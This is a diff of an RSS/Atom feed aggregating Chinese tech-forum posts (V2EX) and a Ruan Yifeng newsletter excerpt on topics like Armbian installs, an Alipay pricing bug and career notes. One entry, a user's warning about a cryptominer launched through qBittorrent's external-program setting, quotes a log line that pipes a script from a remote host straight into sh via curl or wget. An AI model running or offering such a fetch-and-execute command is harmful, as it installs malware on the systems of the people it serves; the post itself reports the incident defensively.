@@ -1,10 +1,96 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>urn:2025-01-17T00:51:15.139Z</id>
+    <id>urn:2025-01-17T02:08:23.212Z</id>
     <title>osmos::feed</title>
-    <updated>2025-01-17T00:51:15.139Z</updated>
+    <updated>2025-01-17T02:08:23.212Z</updated>
     <generator>osmosfeed 1.15.1</generator>
     <link rel="alternate" href="index.html"/>
+    <entry>
+        <title type="html"><![CDATA[要注意， qBittorrent 自动运行 torrent 传播的挖矿脚本]]></title>
+        <id>https://www.v2ex.com/t/1105709</id>
+        <link href="https://www.v2ex.com/t/1105709"/>
+        <updated>2025-01-17T00:28:47.000Z</updated>
+        <summary type="html"><![CDATA[Sanarara: - 在昨天下班回家后，听见 nas 怪吵，看了下探针 CPU50%，检查进程，qbittorrent 进程极为活跃，但是没有正在下载的内容。平时一直用 rss 自动挂 sukebei ，确认过确实没有活跃任务，这就活见鬼了。
+- ssh 中 top 了一下，b3qmud4h 这个进程跑的飞起，怀疑有问题，互联网上搜索一圈，b3qmud4h 为自动生成的字段。
+- kill -9 该进程后，cpu 恢复正常，qb 服务也没出现问题
+- 重启 qbittorrent ，再次出现高 cpu 占用进程，同样为随机字符的任务。
+- 检查 qbittorrent 日志，发现  “运行外部程序。Torrent：“*********”。命令：`sh -c "(curl -skL https://files.synotech.studio || wget --no-check-certificate -qO - https://files.synotech.studio) | sh"`”
+- 通过搜索，得知设置→下载→运行外部程序 选项如果打勾的话，是可以通过种子直接运行脚本的
+- 大家务必检查一下这个设置是否开启，我的印象里是没有认为开启过，可能和包或者是 docker 镜像有关]]></summary>
+        <author>
+            <name>Sanarara</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[n1 盒子 u 盘装完 armbian 为啥拔了 u 盘回进安卓系统的恢复模式啊？]]></title>
+        <id>https://www.v2ex.com/t/1105708</id>
+        <link href="https://www.v2ex.com/t/1105708"/>
+        <updated>2025-01-17T00:27:29.000Z</updated>
+        <summary type="html"><![CDATA[um6uih: 我装完 armbian 也运行了安装到 emmc 的命令，armbian-install ，也有进度，最后说成功了，让我拔出 u 盘，poweroff ，然后开机
+等开机就进安卓那个绿色的小人的恢复模式，试了三次了都是这样
+有没有大佬知道这是啥原因？]]></summary>
+        <author>
+            <name>um6uih</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[科技爱好者周刊（第 334 期）：年终笔记四则]]></title>
+        <id>http://www.ruanyifeng.com/blog/2025/01/weekly-issue-334.html</id>
+        <link href="http://www.ruanyifeng.com/blog/2025/01/weekly-issue-334.html"/>
+        <updated>2025-01-17T00:17:52.000Z</updated>
+        <summary type="html"><![CDATA[这里记录每周值得分享的科技内容，周五发布。
+本杂志开源，欢迎投稿。另有《谁在招人》服务，发布程序员招聘信息。合作请邮件联系（yifeng.ruan@gmail.com）。
+封面图
+
+武汉光谷是今年春节晚会的分会场，将表演灯光秀，非常有科幻感。（via）
+年终笔记四则
+下面是过去的笔记，我读到有意思的文章时，记录下来的感想，每一则都不长。
+前几天翻阅，觉得可以放在一起，重新发布，今天先发四则。
+一、工作也有利息
+银行存款有利息，存得越久，利息越多。
+工作也是一样，也有利息。如果今年的工作可以节省明年或未来的工作时间，就是一份有利息的工作。
+
+工作有利息，意味着你未来的工作时间会变少，多出来的时间，就可以去做别的事情，创造更多的价值。
+这提示我们：
+（1）不要轻易更换工作领域，否则以前积累的利息就作废了。只有在同一个工作领域，才可能产生长期积累，以前的工作为以后打基础，最终产生巨大的利息。
+（2）在职业生涯的早期，积累效果最好，最容易产生复利。开始积累越晚，产生复利就越少。
+（3）有些劳动没有积累效果，不会产生利息，比如重复性的机械劳动（快递、咖啡店员、门卫......），你明年还是要重复做这些事情。
+（4）最好的人生策略就是，找到你深感兴趣、可以长期做下去的领域，在上面投入大量的工作时间（包括质量和数量），然后随着年龄增长，享受以前工作的复利。
+二、巴菲特的选人标准
+巴菲特说，他考察候选人，就看三个"i"。
+
+integrity（正直）
+intelligence（智慧）
+initiative（主动）
+这三个"i"当中，"主动"最重要。"正直"和"智慧"的人到处都是，但如果不主动，不是自己想去做些什么，就什么也不会发生。
+三、快乐机
+1974年，一个美国哲学家提出一个假设，如果世界上有"快乐机"，只要插上电源，就能带来源源不断的快乐，并且无法分辨，这种机器快乐与现实世界的快乐有…]]></summary>
+        <author>
+            <name>阮一峰的网络日志</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[支付宝这次的 Bug 有点严重啊]]></title>
+        <id>https://www.v2ex.com/t/1105707</id>
+        <link href="https://www.v2ex.com/t/1105707"/>
+        <updated>2025-01-16T23:25:49.000Z</updated>
+        <summary type="html"><![CDATA[roundRobin: 
+所有订单都减 20%，，这得多离谱才能让这个功能上线。不过在实名制下是不是都得算不当得利被追回？
+ref: https://www.guancha.cn/politics/2025_01_16_762334.shtml]]></summary>
+        <author>
+            <name>roundRobin</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[现在日本有什么好买的？]]></title>
+        <id>https://www.v2ex.com/t/1105706</id>
+        <link href="https://www.v2ex.com/t/1105706"/>
+        <updated>2025-01-16T22:40:12.000Z</updated>
+        <summary type="html"><![CDATA[licong: 人在京都，大阪准备最后一天回去的时候去逛一下]]></summary>
+        <author>
+            <name>licong</name>
+        </author>
+    </entry>
     <entry>
         <title type="html"><![CDATA[macOS 15.2 无法拨打电话，拨打时会变成启动浏览器，并没有打开什么网页。但上个版本可以正常拨打。]]></title>
         <id>https://www.v2ex.com/t/1105705</id>
@@ -502,41 +588,6 @@ https://upsidedowntext.vip]]></summary>
 谢谢大家的推荐！性价比高点最好 越便宜越好 就是上班摸鱼听小说用]]></summary>
         <author>
             <name>IMZQZ</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[工行追加贷有什么坑]]></title>
-        <id>https://www.v2ex.com/t/1105658</id>
-        <link href="https://www.v2ex.com/t/1105658"/>
-        <updated>2025-01-16T11:38:35.000Z</updated>
-        <summary type="html"><![CDATA[qqqtz: 追加贷（纯信用）
-额度:10 － 50 万
-还款方式:等额，先息
-年限:等额 8 年，先息 3 － 5 年
-月利息:1.63 厘（ 10 万元一个月利息 163 元）]]></summary>
-        <author>
-            <name>qqqtz</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[3599 的 Mac mini 4 丐版好像很容易买到？]]></title>
-        <id>https://www.v2ex.com/t/1105657</id>
-        <link href="https://www.v2ex.com/t/1105657"/>
-        <updated>2025-01-16T11:37:39.000Z</updated>
-        <summary type="html"><![CDATA[wsping: 
-京东预约了下，随便就买到了。]]></summary>
-        <author>
-            <name>wsping</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[网格员们开始查房扰民了]]></title>
-        <id>https://www.v2ex.com/t/1105656</id>
-        <link href="https://www.v2ex.com/t/1105656"/>
-        <updated>2025-01-16T11:25:42.000Z</updated>
-        <summary type="html"><![CDATA[ocsp: 位置深圳，前天刚上门刷过身份证查过房，今天换个人来又敲门，不要太搞笑。。]]></summary>
-        <author>
-            <name>ocsp</name>
         </author>
     </entry>
     <entry>
